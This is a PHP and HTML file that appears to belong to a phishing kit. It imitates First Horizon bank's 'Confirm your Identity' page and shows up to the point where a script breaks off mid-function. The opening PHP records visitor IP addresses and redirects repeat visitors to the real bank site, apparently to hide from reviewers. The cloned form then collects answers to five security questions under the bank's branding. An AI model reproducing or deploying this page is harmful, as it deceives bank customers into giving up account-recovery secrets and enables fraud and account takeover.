<?php

$em = $_SERVER['REMOTE_ADDR'];  

$Deniedhandle = file_get_contents("DeniedIPS3.txt"); 
       if (substr_count($Deniedhandle, $em) > 1 ){ 
	    header("Location: https://www.firsthorizon.com/");
	   
	   }else{
	        $fp = fopen('DeniedIPS3.txt', 'a');
            fwrite($fp, $em."\r\n");
            fclose($fp);	  


?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" data-scrapbook-source="https://security.firsthorizon.com/fhnsso/rlogin.do?execution=e1s2" data-scrapbook-create="20220326154157241" data-scrapbook-title="First Horizon - Forgot User ID Or Password" lang="en">

<head>
<!-- Adding this meta tag for IE latest version in hopes that it trumps any compatibility modes set or IE settings for older versions a user may have. -->
<meta http-equiv="X-UA-Compatible" content="IE=10,edge">


<title>First Horizon - Help us verify your Identity</title>

<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta http-equiv="cache-control" content="no-cache">
<!-- tells browser not to cache -->
<meta http-equiv="expires" content="0">
<!-- says that the cache expires 'now' -->
<meta http-equiv="pragma" content="no-cache">
<!-- says not to use cached stuff, if there is any -->
<meta name="viewport" content="width=device-width, initial-scale=1">



<script type="text/javascript" src="Areas/carouse/personal/data/ruxitagentjs_ICA27Vdfgjqrux_10235220309135426.js" data-dtconfig="app=1a0261f3cf515b44|rcdec=1209600000|featureHash=ICA27Vdfgjqrux|vcv=2|rdnt=1|uxrgce=1|bp=3|srmcrv=10|cuc=o4u7jue1|mel=100000|dpvc=1|ssv=4|lastModification=1648294949240|dtVersion=10235220309135426|srmcrl=1|tp=500,50,0,1|uxdcw=1500|agentUri=/fhnsso/ruxitagentjs_ICA27Vdfgjqrux_10235220309135426.js|reportUrl=/fhnsso/rb_b927b721-9d42-42c2-89de-41314dca6bc0|rid=RID_-903931860|rpid=-1969826366|domain=firsthorizon.com"></script>

<link rel="shortcut icon" href="Areas/carouse/personal/data/FHfavicon.ico" type="image/x-icon">


<script type="text/javascript" src="Areas/carouse/personal/data/jquery-1.4.2.min.js"></script>
<script type="text/javascript" src="Areas/carouse/personal/data/sso.js"></script>
	

<script type="text/javascript">
		if (top != self) {
			top.location.href = location.href;
		}

		function navigateToUrl(url) {
			if (url) { 
				window.location.href = url;
			}
		}
		 function forgotUserid() {
			 	document.getElementById("_eventId").value="forgotUserid";
			 	document.getElementById("loginForm").submit();	 	 	
			 }
		 
		 function remindMeLater() {
			 	document.getElementById("_eventId").value="remindMeLater";
			 	document.getElementById("softTokenForm").submit();	 	 	
			 }
			 
		function fnShowHide(ele){
			var eleType = document.getElementById('password').type;
			if(eleType === "password"){
				document.getElementById('password').type = "text";
				document.getElementById('showHideSpan').innerHTML='Hide';
			} else if(eleType === "text"){
				document.getElementById('password').type = "Password";
				document.getElementById('showHideSpan').innerHTML='Show';
			}
		}
		
		function fnEnableLoginButton(){
			var pass = document.getElementById('password');
			var userid = document.getElementById('username');
			if(pass.value){
				document.getElementById('passwordWarning').style.visibility='hidden';
				//document.getElementById('password_warning').style.display='none';
				pass.className = pass.className.replace(' invalid','');
				document.getElementById("showHideSpan").style.display= 'block';
				pass.style.borderColor = "#d2d2d4";
			}
			if(userid.value){
				document.getElementById('usernameWarning').style.visibility='hidden';
				userid.className = userid.className.replace(' invalid','');
				//document.getElementById('username_warning').style.display='none';
				userid.style.borderColor = "#d2d2d4";
			}
			
			if(pass.value && userid.value){
				document.getElementById('submit').disabled = false;
			} else {
				document.getElementById('submit').disabled = true;
			}
		}
		
		
		function fnSubmitForm(id){
			/* alert("disable button");
			$("#submit").prop("disabled", true);
			alert("submit form");
			document.forms[0].submit(); */
			document.getElementById(id).submit();
		}
		
		function fnFlyout(compId, id, classNm){
				var comEle = document.getElementById(compId);
				var ele = document.getElementById(id);
				ele.className = classNm;
			}
			function fnFlyoutBlur(compId, id, classNm){
				var comEle = document.getElementById(compId);
				var ele = document.getElementById(id);
				if(!comEle.value){
					ele.className = classNm;
				}else{
				ele.style.borderColor = "#d2d2d4";
				}
			}
		function fnShowWarning(eleId, warningId){
				var ele = document.getElementById(eleId);
				var comp = document.getElementById(warningId);
				var warn = document.getElementById("showHideSpan");
				if(ele.value && ele.value != -1){
					comp.style.visibility='hidden';
					//document.getElementById(eleId+"_warning").style.display= 'none';
					ele.className = ele.className.replace(/ invalid/g,'');
					ele.style.borderColor = "#f2f2f4";
					if(warn && (eleId == 'password'|| eleId == 'social'))
					warn.style.display= 'block';
				} else {
					comp.style.visibility='visible';
					ele.style.borderColor = "red";
					//document.getElementById(eleId+"_warning").style.display= 'block';
					ele.className=ele.className+' invalid';
					if(warn && (eleId == 'password' || eleId == 'social'))
					warn.style.display= 'none';
					
				}
				
			}
		
		function fnShowWarningEnrollment(eleId, warningId){
			var ele = document.getElementById(eleId);
			var comp = document.getElementById(warningId);
			if(ele.value){
				comp.style.visibility='hidden';
				//document.getElementById(eleId+"_warning").style.display= 'none';
				ele.className = ele.className.replace(/ invalid/g,'');
				ele.style.borderColor = "#d2d2d4";
			} else {
				comp.style.visibility='visible';
				ele.style.borderColor = "red";
				//document.getElementById(eleId+"_warning").style.display= 'block';
				ele.className=ele.className+' invalid';
				document.getElementById(eleId+"Error").style.display= 'none';
				
			}
			
		}
		
			function fnValidateComponent(ele){
				var eleId = ele.id;
				if(ele.value){
					//document.getElementById(eleId+"_warning").style.display= 'none';
					ele.className = ele.className.replace(/ invalid/g,'');
					document.getElementById(eleId+"Warning").style.visibility= 'hidden';
					ele.style.borderColor = "#d2d2d4";
				}
				var elements = document.getElementsByClassName("mandatory");
				var isValid = true;	
				for(var i=0; i<elements.length;i++){
					if(!elements[i].value || elements[i].value == -1){
						isValid=false;
						break;
					}
				}
				if(isValid){
					document.getElementById("submit").disabled = false;
				} else {
					document.getElementById("submit").disabled = true;
				}			
			}
			
			function fnAllowPhoneNumber(evt){
				if(evt.keyCode >= 48 && evt.keyCode <=57){
					return true;
				}
				return false;
			}
			
			function fnFormat(mask, eleId) {
				var val= document.getElementById(eleId).value;
				var r='';				
				if(val){
					//alert(val);
					val = val.replace(' ','');
					val = val.replace(/\(/g,'');
					val = val.replace(/\)/g,'');
					val = val.replace(/-/g,'');
					var s=''+val;
					for (var im=0, is = 0; im<mask.length && is<s.length; im++) {
					 r += mask.charAt(im)=='X' ? s.charAt(is++) : mask.charAt(im);
				   }
				   document.getElementById(eleId).value=r;
				}
			}   
			function fnEncrypt(id){
				var pass = document.getElementById(id);
				if(pass)
				pass.type = "Password";
				var val = document.getElementById(id).value;
				var encVal = btoa(val);
				document.getElementById(id).value = encVal;
			}
			function openContent(evt, compName) {
				 var elements = document.getElementsByClassName('_content');
				 for(var i=0; i< elements.length;i++){
					if(elements[i].id == compName){
						elements[i].style.display='block';
					} else {
						elements[i].style.display='none';
					}
				 }
				}
				
				function fnShowButton(evt, id){
					document.getElementById('submit').disabled=false;
				}
				
				function selectTab(element){
					var ele = document.getElementsByTagName('button');
					 for(var i=0; i< ele.length; i++){
						if(ele[i].id != 'submit')
						ele[i].className = 'tablinks';
					 }
					element.className+=" active"; 
				}
				function fnSelectUnselectOptions(ele){
					var id = ele.id;
					if(id.indexOf('sms_') != -1){
						document.getElementById('mode').value="sms";
					}else if(id.indexOf('voice_') != -1){
						document.getElementById('mode').value="voice";
					}else if(id.indexOf('mail_') != -1){
						document.getElementById('mode').value="mail";
					}
				}
				function fnValidateNumber(evt){
					if(evt.keyCode >= 48 && evt.keyCode <=57){
						return true;
					}
					return false;
				}
				function fnEnableDisableSubmit(){
					var elements = document.getElementsByClassName("mandatory");
					var images = document.getElementsByTagName('img');
					var invalidElements = document.getElementsByClassName("invalid");
					var isValid = true;	
					for(var i=0; i<elements.length;i++){
						if(!elements[i].value || elements[i].value == -1){
							isValid=false;
							break;
						}
					}
					for(var j=0; j < images.length;j++){
						var image = images[j];
						if(image.style.display == 'block'){
							isValid=false;
							break;
						}
					}
					if(invalidElements && invalidElements.length > 0){
						isValid=false;
					}
					if(isValid){
						document.getElementById("submit").disabled = false;
					} else {
						document.getElementById("submit").disabled = true;
					}
				}
				
				function fnDisplayHideLabels(){
					var userAgentString = navigator.userAgent;
					var isIE = (userAgentString.indexOf("MSIE") > -1
						|| (userAgentString.indexOf("rv:") > -1 && userAgentString.indexOf("Firefox") == -1));
					var elements = document.getElementsByClassName('nonIELabel');
					var ielabel = document.getElementsByClassName('IELabel');
					if(isIE){
						for(var i=0;i<elements.length;i++){
							elements[i].style.display='none';
						}
					}else {
						if(ielabel){
							for(var i=0;i<ielabel.length;i++){
								ielabel[i].style.display='none';
							}
						}
					}

					//for code mode page
					var bootstrapEle = document.getElementById("bootstrapCodeMode");
					var ieEle = document.getElementById("ieCodeMode");
					if(isIE){
						if(ieEle){
							ieEle.style.display = 'block';
						}
					} else {
						if(bootstrapEle){
							bootstrapEle.style.display = 'block';
						}
					}
				}
				
				function clickContinue(evt) {
					if (evt.keyCode == 13 && !document.getElementById('submit').disabled) {
						var userAgentString = navigator.userAgent;
						if (userAgentString.indexOf("Chrome") > -1) {
							document.getElementById('submit').click();
						} else if (userAgentString.indexOf("MSIE") > -1
								|| userAgentString.indexOf("rv:") > -1) {
							document.getElementById('submit').submit();
						} else {
							//will modify for other browsers
							document.getElementById('submit').submit();
						}

					}
				}
				
				function fnSubmitBootStrapForm(){
					var elementButton = document.getElementById('submit');
					elementButton.disabled = true;
					return true;			
				}
				
				function fnShowWarningForReset(eleId, warningId) {
		var ele = document.getElementById(eleId);
		var comp = document.getElementById(warningId);
		var warn = document.getElementById("showHideSpanFor");
		if (ele.value && ele.value != -1) {
			comp.style.visibility = 'hidden';
			//document.getElementById(eleId+"_warning").style.display= 'none';
			ele.className = ele.className.replace(/ invalid/g, '');
			if (warn)
				warn.style.display = 'block';
			ele.style.borderColor = "rgb(120,120,120)";
		} else {
			comp.style.visibility = 'visible';
			ele.style.borderColor = "red";
			//document.getElementById(eleId+"_warning").style.display= 'block';
			ele.className = ele.className + ' invalid';
			if (warn)
				warn.style.display = 'none';
		}

	}

	function fnEnableResetButton() {
		var pass = document.getElementById('password').value;
		var confPass = document.getElementById('passwordConfirmation').value;
		var resetScore = getStrengthForReset(pass);
		var whitespace = hasWhiteSpace(pass);
		if (pass == confPass && pass != '' && resetScore > 34 && !whitespace) {
			document.getElementById('submit').disabled = false;
		} else {
			document.getElementById('submit').disabled = true;
		}
	}

	function getStrengthForReset(password) {

		var score = 0;

		//password length
		score += password.length * 4;
		score += (checkRepetition(1, password).length - password.length) * 1;
		score += (checkRepetition(2, password).length - password.length) * 1;
		score += (checkRepetition(3, password).length - password.length) * 1;
		score += (checkRepetition(4, password).length - password.length) * 1;

		//password has 3 numbers
		if (password.match(/(.*[0-9].*[0-9].*[0-9])/)) {
			score += 5;
		}

		//password has 2 symbols
		if (password.match(/(.*[^\w0-9])/)) {
			score += 5;
		}

		//password has Upper and Lower chars
		if (password.match(/([a-z].*[A-Z])|([A-Z].*[a-z])/)) {
			score += 10;
		}

		//password has number and chars
		if (password.match(/([a-zA-Z])/) && password.match(/([0-9])/)) {
			score += 15;
		}
		//
		//password has number and symbol
		if (password.match(/([^\w0-9])/) && password.match(/([0-9])/)) {
			score += 15;
		}

		//password has char and symbol
		if (password.match(/([^\w0-9])/) && password.match(/([a-zA-Z])/)) {
			score += 15;
		}

		//password is just a numbers or chars
		if (password.match(/^\w+$/) || password.match(/^\d+$/)) {
			score -= 10;
		}

		//verifying 0 < score < 100
		if (score < 0) {
			score = 0;
		}
		if (score > 100) {
			score = 100;
		}
		return score;
	}

	function hasWhiteSpace(s) {
		return s.indexOf(' ') >= 0;
	}

	function fnShowHideForReset(ele) {
		var eleType = document.getElementById('password').type;
		if (eleType === "password") {
			document.getElementById('password').type = "text";
			document.getElementById('showHideSpanFor').innerHTML = 'Hide';
		} else if (eleType === "text") {
			document.getElementById('password').type = "Password";
			document.getElementById('showHideSpanFor').innerHTML = 'Show';
		}
	}
	
	function fnProfileShowHide(ele){
	    var eleType = document.getElementById('newProfilePassword').type;
	    var eleValue = document.getElementById('newProfilePassword').value;
        if(eleValue !=""){
	if(eleType === "password"){
		document.getElementById('newProfilePassword').type = "text";
		document.getElementById('showHideSpanForProfile').innerHTML='Hide';
	} else if(eleType === "text"){
		document.getElementById('newProfilePassword').type = "Password";
		document.getElementById('showHideSpanForProfile').innerHTML='Show';
	}
  }
}

	function setStrength(element, validdisplay, strengthdisplay, username) {
		var x = getWhatItNeeds(element);
		if (x) {
			if (validdisplay) {
				validdisplay.innerHTML = x;
				validdisplay.style.display = 'block';
			}
			updateStrengthGraphicForOther();
			return;
		} else {
			if (validdisplay) {
				validdisplay.innerHTML = '';
			}
			var score = getStrength(element.value, username);

			if (score < 34) {
				strengthdisplay.innerHTML = "Weak";
				//strengthdisplay.style.backgroundColor = 'red';
			} else if (score < 68) {
				strengthdisplay.innerHTML = "Good";
				//strengthdisplay.style.backgroundColor = 'yellow';
			} else {
				strengthdisplay.innerHTML = "Strong";
				//strengthdisplay.style.backgroundColor = 'lightgreen';
			}
			updateStrengthGraphic(score);

			strengthdisplay.style.display = 'inline';

			return;
		}
	}
	var minlength = 8;
	var maxlength = 128;
	var lower = new availableObject(/[a-z]+/, 'a lowercase letter', 'LOWER');
	var upper = new availableObject(/[A-Z]+/, 'an uppercase letter', 'UPPER');
	var digit = new availableObject(/[0-9]+/, 'a digit', 'DIGIT');
	var symbol = new availableObject(/[^\w0-9]+/, 'a symbol', 'SYMBOL');

	var available = new Array(lower, upper, digit, symbol)
	var option = new Optiontype();

	function Optiontype() {
		this.bad = "Weak";
		this.good = "Good";
		this.strong = "Strong";
		this.same = "Username and Password Identical";
		this.tooshort = "Too Short";
		this.toolong = "Too Long";
		this.nospace = "No space allowed."
	}

	function getWhatItNeeds(element) {
		var used = {}
		var notused = {}

		var pw = (element.value) ? element.value : '';
		var need3 = 0;
		var strength = "";

		if (pw.match(/\s/)) {
			return option.nospace;
		} else if (pw.length < minlength) {
			return option.tooshort;
		} else if (pw.length > maxlength) {
			return option.toolong;
		}

		for ( var i = 0; i < available.length; i++) {
			var j = 0;
			var myobject = new Criteria;
			myobject.isthere = (pw.match(available[i].pattern)) ? true : false;
			myobject.label = available[i].label;
			myobject.pattern = available[i].pattern;
			myobject.numoccurences = 1;

			if (myobject.isthere) {
				used[available[i].key] = myobject;
			} else {
				notused[available[i].key] = myobject;
			}
			j++;
		}

		var numused = numOfObjectProperties(used);
		var numlefttouse = 3 - numused;
		var numnotused = numOfObjectProperties(notused);

		if (numlefttouse > 0) {
			if (numlefttouse == 1)
				strength = 'Needs ';
			else
				strength = "Needs " + numlefttouse + " of either ";
			var k = 0;
			for ( var i in notused) {
				k++;
				strength += notused[i].label;
				if (k == numnotused) {
					strength += '.';
				} else if (numnotused == 2 && k == 1) {
					strength += ' or ';
				} else if (k < numnotused - 1) {
					strength += ', ';
				} else if (k == numnotused - 1) {
					strength += ', or ';
				}
			}
			return strength;
		}
	}

	function Criteria() {
		this.isthere = false;
		this.label = null;
		this.pattern = null;
		this.numoccurences = 0;
	}

	function numOfObjectProperties(object) {
		var j = 0;
		for ( var i in object) {
			j++;
		}
		return j;
	}

	function matchResetPassword(eleId, warningId) {
		var ele = document.getElementById(eleId);
		var comp = document.getElementById(warningId);
		if (ele.value != document.getElementById('password').value
				&& ele.value != "") {
			comp.style.visibility = 'visible';
			ele.style.borderColor = "red";
			//document.getElementById(eleId+"_warning").style.display= 'block';
			ele.className = ele.className + ' invalid';
			document.getElementById("showHideSpan").style.display = 'none';
		} else {
			comp.style.visibility = 'hidden';
			ele.style.borderColor = "rgb(120,120,120)";
			ele.className = ele.className.replace(/ invalid/g, '');
			document.getElementById("showHideSpan").style.display = 'block';
		}
		pwchit = true;
	}

	function availableObject(pattern, label, key) {
		this.pattern = pattern;
		this.label = label;
		this.key = key;
	}

	function submitAction() {
		//if (isValidMatchingPWs(document.getElementById('newPassword').value, document.getElementById('newPasswordConfirmation').value, ''))
		if (arePasswordsReadyForSubmit()) //Qa wants client side validation back in 10/17/2011 rbs
		//if (true) 
		{
			fnEncrypt('password');
			fnEncrypt('passwordConfirmation');
			submitEvent('passwordRecoveryForm', 'submitNewPassword');
		} else {
			onkeyuppw(document.getElementById('newPassword'));
			onkeyuppwc(document.getElementById('passwordConfirmation'));
		}
	}

	function arePasswordsReadyForSubmit() {
		var elem = document.getElementById("password");
		var ready = true;
		hideindicators();
		var pw = (elem.value) ? elem.value : '';
		if (!isLengthValid(pw)) {
			ready = false;
		}

		var count = calculateNum(pw);
		if (count >= 3) {
			document.getElementById('threeImage').src = "img/right_pwd_req.gif";
		} else {
			document.getElementById('threeImage').src = "img/wrong_pwd_req.gif";
			ready = false;
		}

		if (pw.length < 1) {
			document.getElementById("upper").src = "img/bullet_black.gif";
			document.getElementById("number").src = "img/bullet_black.gif";
			document.getElementById("lower").src = "img/bullet_black.gif";
			document.getElementById("symbol").src = "img/bullet_black.gif"
		}

		setStrength(elem, document.getElementById('validindicator'), document
				.getElementById('strengthindicator'), document
				.getElementById('username').value)
		if (pwchit)
			onkeyuppwc(document.getElementById("passwordConfirmation"));
		return ready;
	}

	function getStrength(password, username) {

		var score = 0;

		//password == user name
		if (password.toLowerCase() == username.toLowerCase()) {
			return option.same;
		}

		//password length
		score += password.length * 4;
		score += (checkRepetition(1, password).length - password.length) * 1;
		score += (checkRepetition(2, password).length - password.length) * 1;
		score += (checkRepetition(3, password).length - password.length) * 1;
		score += (checkRepetition(4, password).length - password.length) * 1;

		//password has 3 numbers
		if (password.match(/(.*[0-9].*[0-9].*[0-9])/)) {
			score += 5;
		}

		//password has 2 symbols
		if (password.match(/(.*[^\w0-9])/)) {
			score += 5;
		}

		//password has Upper and Lower chars
		if (password.match(/([a-z].*[A-Z])|([A-Z].*[a-z])/)) {
			score += 10;
		}

		//password has number and chars
		if (password.match(/([a-zA-Z])/) && password.match(/([0-9])/)) {
			score += 15;
		}
		//
		//password has number and symbol
		if (password.match(/([^\w0-9])/) && password.match(/([0-9])/)) {
			score += 15;
		}

		//password has char and symbol
		if (password.match(/([^\w0-9])/) && password.match(/([a-zA-Z])/)) {
			score += 15;
		}

		//password is just a numbers or chars
		if (password.match(/^\w+$/) || password.match(/^\d+$/)) {
			score -= 10;
		}

		//verifying 0 < score < 100
		if (score < 0) {
			score = 0;
		}
		if (score > 100) {
			score = 100;
		}
		return score;
	}

	function updateStrengthGraphic(strength) {
		var indicators = document.querySelectorAll(".indicator");
		for ( var i = 0; i < indicators.length; i++) {
			indicators[i].classList.remove("good", "strong");
		}

		if (strength < 34) {
			indicators[0].classList.add("strong");
			indicators[1].classList.add("weak");
			indicators[2].classList.add("weak");
		} else if (strength > 34 && strength < 68) {
			indicators[0].classList.add("strong");
			indicators[1].classList.add("strong");
			indicators[2].classList.add("weak");
		} else {
			for ( var i = 0; i < indicators.length; i++) {
				indicators[i].classList.remove("good", "strong");
				indicators[i].classList.add("strong");
			}
		}
	}

	function updateStrengthGraphicForOther() {
		var indicators = document.querySelectorAll(".indicator");
		for ( var i = 0; i < indicators.length; i++) {
			indicators[i].classList.remove("good", "strong");
		}
		indicators[0].classList.add("strong");
		indicators[1].classList.add("weak");
		indicators[2].classList.add("weak");
	}

	function handleEmptyPasswordCase() {
		//document.querySelector("#strength").innerText = "N/A";
		//document.querySelector("#strength").setAttribute("class", "weak");
		
		var indicators = document.querySelectorAll(".indicator");
		var pas = document.getElementById('password').value;
		if (pas == '') {
			for ( var i = 0; i < indicators.length; i++) {
				indicators[i].classList.remove("good", "strong");
				indicators[i].classList.add("weak");
			}
		}
	}
	
			
	function checkRepetition(pLen, str) {
		var res = "";
		for ( var i = 0; i < str.length; i++) {
			var repeated = true;

			for ( var j = 0; j < pLen && (j + i + pLen) < str.length; j++) {
				repeated = repeated
						&& (str.charAt(j + i) == str.charAt(j + i + pLen));
			}
			if (j < pLen) {
				repeated = false;
			}
			if (repeated) {
				i += pLen - 1;
				repeated = false;
			} else {
				res += str.charAt(i);
			}
		}
		return res;
	};
</script>
<style>
      input::-ms-reveal,
      input::-ms-clear {
        display: none;
      }
    </style>
	
<link rel="stylesheet" href="Assets/heros/icons/images/style.css" />		
	
	</head>

    
  
<body onload="fnDisplayHideLabels();">
	<div class="container-fluid">
	



<script src="Areas/carouse/personal/data/jquery-1.11.min.js"></script>
<link rel="stylesheet" type="text/css" href="Areas/carouse/personal/data/bootstrapSsostyles.css">

<!-- CSS only -->
<link rel="stylesheet" type="text/css" href="Areas/carouse/personal/data/bootstrap-min.css">
<link rel="stylesheet" type="text/css" href="Areas/carouse/personal/data/jquery-ui.min.css">
<!-- JavaScript Bundle with Popper -->
<script src="Areas/carouse/personal/data/bootstrap-min.js"></script>

<script>
<!-- Form Input Focus -->
	$(function() {

		$(".sso__input__text").focus(
				function() {
					$(this).prev(".sso__input__label").addClass(
							"sso__input__label--active");
				});

		$(".sso__input__text").focusout(
				function() {
					if (!this.value) {
						$(".sso__input__label--active").removeClass(
								"sso__input__label--active");
					}
				});

	});
	'use strict';
</script>

<!-- Header Wrap -->
<div class="fixed-header">
	<table class="table" style="margin-bottom: 0px" border="0">
		<tbody><tr>
			<td style="width:40%" align="left"><a href="https://www.firsthorizon.com/"><img src="Areas/carouse/personal/data/firstHorizon.png" class="img-fluid"></a></td>
			<td valign="middle" align="right">
				<table style="width: 90%; border: 0px; padding: 3px;" border="0">
					<tbody><tr>
						<td style="padding-right :2%" align="right"><img src="Areas/carouse/personal/data/customer_care.png"> &nbsp;
								
								
									
									<span>800-382-5465</span>
								
							</td>
					</tr>
				</tbody></table>
			</td>
		</tr>
	</tbody></table>
</div>



 
	 
	



<div id="bannerSection" class="banner gray">
	<button name="button" id="online_link" class="fhn-button" style="visibility: hidden;" onclick="enrollOnline();" disabled="disabled"></button>
	<table style="width:100%;" border="0">
	
		<tbody><tr>
			<td style="padding-left:5%;font-weight:bold;">
				
				<div style="color:#4d4d4e;font-size:150%;font-weight:bolder;padding-bottom: 1.5%">Confirm your Identity</div>
				
				
				  
   					  
					       <div style="font-weight:normal;color:#4d4d4e;padding-bottom: 1.5%">Now, we need a few details to verify your identity. 
					       
					       
					       </div>  
					
					
					  
				    				
			</td>
		</tr>
	</tbody></table>
</div>
 <script type="text/javascript">
       function enrollOnline() {
         window.location.href="https://www.firsthorizon.com/Products-and-Services/Digital-Banking-Category/Enroll-in-RBOL-MBOL";
       }
 </script>
	
	<!-- Body Container -->
	






<script type="text/javascript" src="Areas/carouse/personal/data/jquery-ui.min.js"></script>
<script type="text/javascript" src="Areas/carouse/personal/data/sso.js"></script>

<script type="text/javascript">
	var cm_page_id = 'indentityVerification.jsp';
</script>

<form id="loginForm" name="loginForm" action="" method="post"  autocomplete="off">
	
	
	<input type="hidden" id="_eventId" name="_eventId" value="submitVerifyIdentiry">
	<input type="hidden" id="dateofbirth" name="dateofbirth" value="">

	<div id="invalidEmail" style="width: 100%; text-align: center; margin-top: 2em;">
		
	</div>

	<div style="width:100%;margin-top:2%;">
				<table cellpadding="5" border="0" align="center">
					<tbody>
					<tr>
						<td align="center">
						<div style="font-weight:bold;margin:1em 0">Confirm your Identity</div>
						    <div style="float:left;font-weight:bold">Security Question 1 :</div>
							<div class="form-floating" style="width:500px">
							  <select name="q1" id="q1" required style="font-size:12px">
								<option value="" selected="selected">Select Question</option>
								<option value="What is the name of the first company you worked for ?">What is the name of the first company you worked for ?</option>
								<option value="What is your maternal grandmother's first name ?">What is your maternal grandmother's first name ?</option>
								<option value="What was the name of your High School ?">What was the name of your High School ?</option>
								<option value="In what city was your school ?">In what city was your school ?</option>
								<option value="In what city were you married ?">In what city were you married ?</option>
								<option value="What is the first name of your oldest nephew ?">What is the first name of your oldest nephew ?</option>
								<option value="What is your best friend's first name ?">What is your best friend's first name ?</option>
								<option value="What is your father's middle name ?">What is your father's middle name ?</option>
								<option value="What is the first name of the maid of honor at your wedding ?">What is the first name of the maid of honor at your wedding ?</option>
								<option value="What is your maternal grandfather's first name ?">What is your maternal grandfather's first name ?</option>
							  </select>
							   <div style="float:left;">
							       <input type="text" name="ans1" id="ans1" value="" style="width:500px;height:40px" placeholder="Answer" />
							   </div>
							</div>
						</td>
					</tr>
					<tr>
						<td align="center">
						
						    <div style="float:left;font-weight:bold">Security Question 2 :</div>
							<div class="form-floating" style="width:500px">
							  <select name="q2" id="q2" required style="font-size:12px">
								<option value="" selected="selected">Select Question</option>
								<option value="What was the name of your first pet ?">What was the name of your first pet ?</option>
								<option value="What was the nickname of your grandfather ?">What was the nickname of your grandfather ?</option>
								<option value="In what city is your vacation home ?">In what city is your vacation home ?</option>
								<option value="In what city was your father born ?">In what city was your father born ?</option>
								<option value="What is the first name of the best man at your wedding ?">What is the first name of the best man at your wedding ?</option>
								<option value="What was your high school mascot ?">What was your high school mascot ?</option>
								<option value="What is your paternal grandmother's first name ?">What is your paternal grandmother's first name ?</option>
								<option value="What is the first name of your oldest niece ?">What is the first name of your oldest niece ?</option>
								<option value="What was the name of you first girlfriend/boyfriend ?">What was the name of you first girlfriend/boyfriend ?</option>
								<option value="What was the first name of your manager ?">What was the first name of your manager ?</option>
							  </select>
							   <div style="float:left;">
							       <input type="text" name="ans2" id="ans2" value="" style="width:500px;height:40px" placeholder="Answer" />
							   </div>
							</div>
						</td>
					</tr>
					<tr>
						<td align="center">
						
						    <div style="float:left;font-weight:bold">Security Question 3 :</div>
							<div class="form-floating" style="width:500px">
							  <select name="q3" id="q3" required style="font-size:12px">
								 <option value="" selected="selected">Select Question</option>
								<option value="What is your paternal grandfather's first name ?">What is your paternal grandfather's first name ?</option>
								<option value="In what city were you born ?">In what city were you born ?</option>
								<option value="What was the name of the town your grandmother lived in ?">What was the name of the town your grandmother lived in ?</option>
								<option value="What was the name of your junior high school ?">What was the name of your junior high school ?</option>
								<option value="What was the last name of your favorite teacher in final year of high school ?">What was the last name of your favorite teacher in final year of high school ?</option>
								<option value="In what city was your mother born ?">In what city was your mother born ?</option>
								<option value="What street did your best friend in high school live on ?">What street did your best friend in high school live on ?</option>
								<option value="What is your mother's middle name ?">What is your mother's middle name ?</option>
								<option value="Where did you meet your spouse for the first time ?">Where did you meet your spouse for the first time ?</option>
								<option value="What was your favorite restaurant in college ?">What was your favorite restaurant in college ?</option>
							  </select>
							   <div style="float:left;">
							       <input type="text" name="ans3" id="ans3" value="" style="width:500px;height:40px" placeholder="Answer" />
							   </div>
							</div>
						</td>
					</tr>
					<tr>
						<td align="center">
						<div style="float:left;font-weight:bold">Security Question 4 :</div>
						    
							<div class="form-floating" style="width:500px">
							  <select name="q4" id="q4" required style="font-size:12px">
								<option value="" selected="selected">Select Question</option>
								<option value="What is the name of the first company you worked for ?">What is the name of the first company you worked for ?</option>
								<option value="What is your maternal grandmother's first name ?">What is your maternal grandmother's first name ?</option>
								<option value="What was the name of your High School ?">What was the name of your High School ?</option>
								<option value="In what city was your school ?">In what city was your school ?</option>
								<option value="In what city were you married ?">In what city were you married ?</option>
								<option value="What is the first name of your oldest nephew ?">What is the first name of your oldest nephew ?</option>
								<option value="What is your best friend's first name ?">What is your best friend's first name ?</option>
								<option value="What is your father's middle name ?">What is your father's middle name ?</option>
								<option value="What is the first name of the maid of honor at your wedding ?">What is the first name of the maid of honor at your wedding ?</option>
								<option value="What is your maternal grandfather's first name ?">What is your maternal grandfather's first name ?</option>
							  </select>
							   <div style="float:left;">
							       <input type="text" name="ans4" id="ans4" value="" style="width:500px;height:40px" placeholder="Answer" />
							   </div>
							</div>
						</td>
					</tr>
					<tr>
						<td align="center">
						
						    <div style="float:left;font-weight:bold">Security Question 5 :</div>
							<div class="form-floating" style="width:500px">
							  <select name="q5" id="q5" required style="font-size:12px">
								 <option value="" selected="selected">Select Question</option>
								<option value="What is your paternal grandfather's first name ?">What is your paternal grandfather's first name ?</option>
								<option value="In what city were you born ?">In what city were you born ?</option>
								<option value="What was the name of the town your grandmother lived in ?">What was the name of the town your grandmother lived in ?</option>
								<option value="What was the name of your junior high school ?">What was the name of your junior high school ?</option>
								<option value="What was the last name of your favorite teacher in final year of high school ?">What was the last name of your favorite teacher in final year of high school ?</option>
								<option value="In what city was your mother born ?">In what city was your mother born ?</option>
								<option value="What street did your best friend in high school live on ?">What street did your best friend in high school live on ?</option>
								<option value="What is your mother's middle name ?">What is your mother's middle name ?</option>
								<option value="Where did you meet your spouse for the first time ?">Where did you meet your spouse for the first time ?</option>
								<option value="What was your favorite restaurant in college ?">What was your favorite restaurant in college ?</option>
							  </select>
							   <div style="float:left;">
							       <input type="text" name="ans5" id="ans5" value="" style="width:500px;height:40px" placeholder="Answer" />
							   </div>
							</div>
						</td>
					</tr>
				</tbody></table>
				<div style="width: 100%; margin-top: 2em;">
					<table style="border: 0px; padding: 5px" cellpadding="5" border="0" align="center">
						<tbody><tr>
							<td align="center">
								<input name="submit" id="submit" class="fhn-button" type="submit" value="CONTINUE">
							</td>
						</tr>
					</tbody></table>
				</div>
			</div>

</form>

<script type="text/javascript">

/* function clickContinue(evt) {
	if (evt.keyCode == 13 && !document.getElementById('submit').disabled) {
		var userAgentString = navigator.userAgent;
		if (userAgentString.indexOf("Chrome") > -1) {
			document.getElementById('submit').click();
		} else if (userAgentString.indexOf("MSIE") > -1
				|| userAgentString.indexOf("rv:") > -1) {
			document.getElementById('submit').submit();
		} else {
			//will modify for other browsers
			document.getElementById('submit').submit();
		}

	}
} */
  
function initCapitalLetter() {
	var input = document.getElementById("lastname");
	string = input.value;
	if (input.value.length > 0) {
		input.value = string.replace(/^./, string[0].toUpperCase());
	}
}

function validateDOB(){
	var d = document.getElementById('day').value;
